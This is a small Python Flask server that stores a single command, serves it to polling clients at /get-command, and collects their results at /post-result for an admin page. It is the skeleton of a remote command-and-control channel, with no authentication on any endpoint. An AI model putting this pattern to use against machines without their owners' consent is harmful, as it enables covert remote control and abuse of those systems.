from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

current_command = "none"
last_result = ""

@app.route("/")
def home():
    return render_template_string(open("admin.html").read(), result=last_result)

@app.route("/send-command", methods=["POST"])
def send_command():
    global current_command
    current_command = request.form.get("command", "none")
    return "Command updated"

@app.route("/get-command", methods=["GET"])
def get_command():
    return current_command

@app.route("/post-result", methods=["POST"])
def post_result():
    global last_result
    data = request.get_json()
    last_result = data.get("result", "")
    return "Result received"

